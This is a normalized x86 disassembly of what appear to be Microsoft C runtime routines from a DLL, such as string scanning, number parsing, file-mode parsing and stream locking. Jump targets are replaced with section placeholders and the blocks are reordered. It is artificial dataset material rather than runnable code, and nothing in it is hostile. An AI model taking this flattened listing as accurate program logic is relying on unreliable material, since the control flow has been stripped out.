xor ebx ebx
call sub_10004c7f
add esp 0x20
test al 0x4
mov [ ebp - 0x14 ] eax
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_100096f0
test [ ebp - 0x14 ] 0x2
pop ecx
pop ecx
jne r-xdata
mov ebx 0x200
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
jmp r-xdata
mov ebx 0x80
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov [ esi + 0x14 ] eax
pop edi
mov [ esi ] ebx
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_100026a8
leave
retn
or ebx 0x100
cmp eax 0x2
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
sub_10004ac0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_10004b4b
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_100027e4
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_1000a174
test eax eax
pop ecx
pop ecx
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_10009242
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10004c7f
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
xor esi esi
mov [ ebp - 0x7c ] eax
mov eax [ ebp + 0xc ]
inc esi
xor ecx ecx
cmp [ ebp + 0x24 ] ebx
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x6c ] ebx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_100049cb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000496c
add esp 0x14
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100026a8
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_10005313 ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
mov [ ebp - 0x58 ] esi
jbe r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
cmp al 0x9
mov [ ebp - 0x5c ] esi
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_1000ad13
mov eax [ ebp - 0x64 ]
xor ecx ecx
add esp 0xc
cmp [ ebp - 0x68 ] ecx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] ecx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
cmp al 0x63
jle r-xdata
cmp [ ebp - 0x5c ] ecx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp al 0x65
jg r-xdata
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x7c ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
mov [ ebp - 0x6c ] 0x1
mov esi rw-data
sub esi 0x60
cmp eax ecx
mov [ ebp - 0x54 ] eax
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] ecx
jne r-xdata
neg eax
mov esi rw-data
mov [ ebp - 0x54 ] eax
sub esi 0x60
cmp [ ebp - 0x54 ] ecx
je r-xdata
mov [ ebp - 0x3c ] cx
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add esi 0x54
and eax 0x7
test eax eax
mov [ ebp - 0x4c ] esi
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
add eax esi
mov ebx eax
cmp [ ebx ] 0x8000
mov [ ebp - 0x70 ] ebx
jb r-xdata
movzx edx [ ebx + 0xa ]
mov ecx [ ebp - 0x32 ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov eax edx
mov edi 0x7fff
xor eax ecx
and ecx edi
and edx edi
and eax 0x8000
cmp cx 0x7fff
lea edi [ edx + ecx ]
movzx edi di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
mov esi [ ebp - 0x4c ]
lea ebx [ ebp - 0x48 ]
mov [ ebp - 0x70 ] ebx
neg ax
sbb eax eax
and [ ebp - 0x38 ] 0x0
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp dx 0x7fff
jae r-xdata
cmp di 0xbffd
ja r-xdata
cmp di 0x3fbf
ja r-xdata
test cx cx
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
xor ecx ecx
cmp dx cx
jne r-xdata
inc edi
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
and [ ebp - 0x68 ] ecx
lea esi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc edi
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
inc esi
inc esi
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x3c ]
add ebx 0x8
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x60 ] ebx
cmp [ ebx + 0x4 ] ecx
jne r-xdata
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x58 ]
add ecx ecx
test edx edx
mov [ ebp - 0x64 ] edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x78 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebx ] ecx
jne r-xdata
and [ ebp - 0x32 ] cx
jmp r-xdata
add edi 0xffff
test di di
jge r-xdata
test [ ebp - 0x24 ] 0x80000000
jne r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x78 ] 0x0
mov [ esi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x3c ] ecx
jmp r-xdata
cmp [ ebp - 0x2c ] 0x8000
ja r-xdata
mov ecx edi
neg ecx
movzx esi cx
add edi esi
test di di
jg r-xdata
mov esi [ ebp - 0x28 ]
mov ecx [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr ecx 0x1f
mov edx esi
add esi esi
or esi ecx
mov ecx [ ebp - 0x24 ]
shr edx 0x1f
add ecx ecx
or ecx edx
add edi 0xffff
test di di
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] ecx
jg r-xdata
mov ecx [ ebp - 0x60 ]
mov edx [ ebp - 0x5c ]
movzx edx [ edx ]
movzx ecx [ ecx ]
and [ ebp - 0x78 ] 0x0
imul ecx edx
mov edx [ esi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
mov ebx [ ebp - 0x70 ]
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x2c ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x24 ]
mov ebx [ ebp - 0x28 ]
mov edx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl ecx 0x1f
shr ebx 0x1
or ebx ecx
mov ecx [ ebp - 0x2c ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec esi
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x2c ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
cmp di 0x7fff
mov esi [ ebp - 0x4c ]
jae r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] 0x0
je r-xdata
mov cx [ ebp - 0x2a ]
mov [ ebp - 0x3c ] cx
mov ecx [ ebp - 0x28 ]
mov [ ebp - 0x3a ] ecx
mov ecx [ ebp - 0x24 ]
or edi eax
mov [ ebp - 0x36 ] ecx
mov [ ebp - 0x32 ] di
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
cmp [ ebp - 0x22 ] 0xffff
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] 0x8000
inc edi
jmp r-xdata
sub_10005366
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_1000541e
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_100027e4
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_10005482
push 0xc
push r--data
call sub_10005acc
push 0xe
call sub_100072ab
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100054e9
call sub_10005b11
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_100063a9
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_100063a9
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_10005500
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_1000558e
mov eax [ rw-data ]
test eax eax
push esi
push 0x14
pop esi
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_100084a8
test eax eax
pop ecx
pop ecx
mov [ rw-data ] eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_100084a8
test eax eax
pop ecx
pop ecx
mov [ rw-data ] eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov edi edx
and edi 0x1f
imul edi edi 0x28
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_1000565f
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_100072ab
pop ecx
retn
sub_1000568e
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
add eax 0x10
push eax
call sub_100072ab
pop ecx
retn
sub_100056b1
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_100071d3
pop ecx
retn
sub_100056e0
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
add eax 0x10
push eax
call sub_100071d3
pop ecx
retn
sub_10005703
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ebx
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
mov al [ esi ]
cmp al 0x61
je r-xdata
mov [ ebp + 0xc ] 0x109
cmp al 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
mov edx 0x80
mov edi 0x4000
or [ ebp - 0x4 ] 0x1
mov [ ebp + 0xc ] ebx
jmp r-xdata
cmp al 0x77
je r-xdata
inc esi
cmp [ esi ] bl
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
movsx eax al
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
mov al [ esi ]
cmp al bl
push edi
je r-xdata
mov [ ebp + 0xc ] 0x301
jmp r-xdata
call sub_100049cb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000496c
add esp 0x14
xor eax eax
jmp r-xdata
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_1000b688
add esp 0x14
test eax eax
je r-xdata
call sub_100049cb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000496c
add esp 0x14
jmp r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x2
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
test [ ebp + 0xc ] 0x1000
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0x20
je r-xdata
pop edi
inc esi
push 0x4
push esi
push r--data
call sub_1000ba3c
add esp 0xc
test eax eax
jne r-xdata
or [ ebp + 0xc ] 0x1000
xor ecx ecx
jmp r-xdata
test [ ebp + 0xc ] 0xc000
jne r-xdata
dec eax
je r-xdata
or [ ebp + 0xc ] 0x20
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
inc esi
mov al [ esi ]
cmp al bl
jne r-xdata
sub eax 0xb
je r-xdata
add esi 0x4
push r--data
push esi
call sub_1000b8c0
test eax eax
pop ecx
pop ecx
jne r-xdata
cmp ecx ebx
je r-xdata
or [ ebp + 0xc ] 0x8000
jmp r-xdata
cmp [ ebp - 0xc ] ebx
jne r-xdata
sub eax 0xb
je r-xdata
test [ ebp + 0xc ] 0x2
jne r-xdata
dec eax
je r-xdata
push r--data
push esi
call sub_1000b8c0
test eax eax
pop ecx
pop ecx
jne r-xdata
add esi 0x5
or [ ebp + 0xc ] 0x40000
jmp r-xdata
or [ ebp - 0x4 ] edi
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] ebx
jne r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebp + 0xc ]
and eax 0xfffffffe
or eax 0x2
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x4 ]
and eax 0xfffffffc
or eax edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
push r--data
push esi
call sub_1000b8c0
test eax eax
pop ecx
pop ecx
jne r-xdata
add esi 0x8
or [ ebp + 0xc ] 0x20000
jmp r-xdata
and [ ebp - 0x4 ] 0xffffbfff
mov [ ebp - 0xc ] 0x1
jmp r-xdata
test [ ebp + 0xc ] 0xc000
jne r-xdata
test [ ebp + 0xc ] 0x40
jne r-xdata
sub eax 0xa
je r-xdata
add esi 0x7
or [ ebp + 0xc ] 0x10000
jmp r-xdata
or [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp + 0xc ] 0x40
jmp r-xdata
or [ ebp + 0xc ] edx
jmp r-xdata
sub eax 0x4
jne r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
or [ ebp + 0xc ] 0x10
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
sub_100059a5
push 0x10
push r--data
call sub_10005acc
xor ebx ebx
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_100072ab
pop ecx
mov [ ebp - 0x4 ] ebx
xor esi esi
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10005ac2
mov eax edi
call sub_10005b11
retn
mov [ edi + 0x4 ] ebx
mov [ edi + 0xc ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
or [ edi + 0x10 ] 0xffffffff
shl esi 0x2
push 0x38
call sub_10008468
pop ecx
mov ecx [ rw-data ]
mov [ esi + ecx ] eax
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
jne r-xdata
push 0xfa0
mov eax [ eax ]
add eax 0x20
push eax
call sub_1000ba6d
pop ecx
pop ecx
test eax eax
mov eax [ rw-data ]
jne r-xdata
inc esi
jmp r-xdata
lea eax [ esi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ esi + eax ]
push [ esi + eax ]
call sub_100063a9
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_1000568e
pop ecx
pop ecx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ esi + 0x10 ]
push eax
call sub_100071e8
pop ecx
test eax eax
je r-xdata
mov edi eax
jmp r-xdata
push eax
push esi
call sub_100056e0
pop ecx
pop ecx
mov [ ebp - 0x1c ] edi
sub_10005acc
push sub_10005b30
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
